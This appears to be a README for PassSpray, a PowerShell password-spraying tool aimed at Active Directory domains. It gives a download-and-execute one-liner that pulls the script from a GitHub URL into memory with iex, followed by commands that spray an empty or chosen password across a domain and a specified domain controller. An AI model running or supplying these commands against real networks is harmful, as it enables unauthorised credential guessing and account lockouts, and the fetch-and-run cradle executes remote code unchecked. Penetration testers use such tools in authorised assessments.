# PassSpray
Domain Password Spray

Important: Spraying passwords increases the Bad Pwd Count of the user you are trying to validate credentials for (for each wrong attempt)

### Load PassSpray in memory
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/PassSpray/main/PassSpray.ps1')
```

### Spray Empty password
```
Invoke-PassSpray
```

### Spray a password across the Domain
```
Invoke-PassSpray -Password P@ssw0rd!
```

### Spray a password across the Domain - Specify Domain and DC
```
Invoke-PassSpray -Password P@ssw0rd! -Domain ferrari.local -DomainController DC01.ferrari.local
```
